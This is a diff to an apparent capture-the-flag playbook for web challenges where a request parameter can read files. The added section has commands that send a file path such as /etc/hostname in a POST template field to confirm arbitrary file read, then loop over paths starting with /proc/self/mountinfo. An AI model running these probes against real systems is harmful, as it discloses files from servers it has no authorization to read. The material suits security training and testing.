@@ -105,6 +105,37 @@ that writes as well as reads, and a datastore that can write files.
 - On a shared instance, read; do not write.
 - Budget and escalation as in `../LOOP_DISCIPLINE.md`.
 
+## Operational probe
+
+Do not start with traversal. Ask for an absolute path the target certainly has,
+so a 200 separates "the parameter reaches the filesystem" from "the parameter is
+confined":
+
+```bash
+python3 tools/web/http_probe.py --challenge "$C" --class file-read-primitives \
+  --url "$BASE/export" --method POST --body 'template=/etc/hostname&data={"id":"x"}' \
+  --evidence-contains "$(hostname)" --evidence-kind class \
+  --on-match confirms --on-miss inconclusive
+```
+
+Once a read is proven, stop hand-rolling the loop:
+
+```bash
+python3 tools/web/read_loop.py --url "$BASE/export" --method POST \
+  --body 'template={path}&data={"id":"x"}' --profile container --extract-paths
+```
+
+`--profile container` leads with `/proc/self/mountinfo`, which names every host
+path bind-mounted in — the single most informative file on a containerised
+target, and the one that says whether the flag is mounted as a file at all.
+
+**Falsifier:** the path is resolved and confined to a fixed directory. A 404 that
+echoes your cleaned input is a *sanitiser* oracle, not a read.
+
+Pipe the result straight into the write gate: `http_probe.py` already emits the
+shape `tools/hooks.py post-probe` wants, so the excerpt is verbatim and a
+transport failure is recorded as `transport`, which can never confirm.
+
 ## Field notes
 
 `field-notes.md` in this directory grows every time a challenge of this class
